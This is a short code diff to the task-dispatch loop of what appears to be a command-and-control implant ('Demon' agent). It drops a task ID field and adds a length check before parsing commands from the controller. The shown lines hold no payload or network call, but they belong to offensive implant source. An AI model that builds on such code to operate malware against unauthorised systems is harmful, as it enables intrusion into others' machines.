@@ -48,7 +48,6 @@ VOID CommandDispatcher( VOID )
     LPVOID   TaskBuffer     = NULL;
     UINT32   TaskBufferSize = 0;
     UINT32   CommandID      = 0;
-    UINT32   TaskID         = 0;
     BOOL     AlreadyDec     = FALSE;
     BOOL     FoundCommand   = FALSE;
 
@@ -72,13 +71,15 @@ VOID CommandDispatcher( VOID )
             ParserNew( &Parser, DataBuffer, DataBufferSize );
             do
             {
+                if ( Parser.Length < 8 )
+                    break;
+
                 CommandID  = ParserGetInt32( &Parser );
-                TaskID     = ParserGetInt32( &Parser );
                 TaskBuffer = ParserGetBytes( &Parser, &TaskBufferSize );
 
                 if ( CommandID != DEMON_COMMAND_NO_JOB )
                 {
-                    PRINTF( "Task => CommandID:[%d : %x] TaskID:[%x] TaskBuffer:[%x : %d]\n", CommandID, CommandID, TaskID, TaskBuffer, TaskBufferSize )
+                    PRINTF( "Task => CommandID:[%d : %x] TaskBuffer:[%x : %d]\n", CommandID, CommandID, TaskBuffer, TaskBufferSize )
                     if ( TaskBufferSize != 0 )
                     {
                         ParserNew( &TaskParser, TaskBuffer, TaskBufferSize );
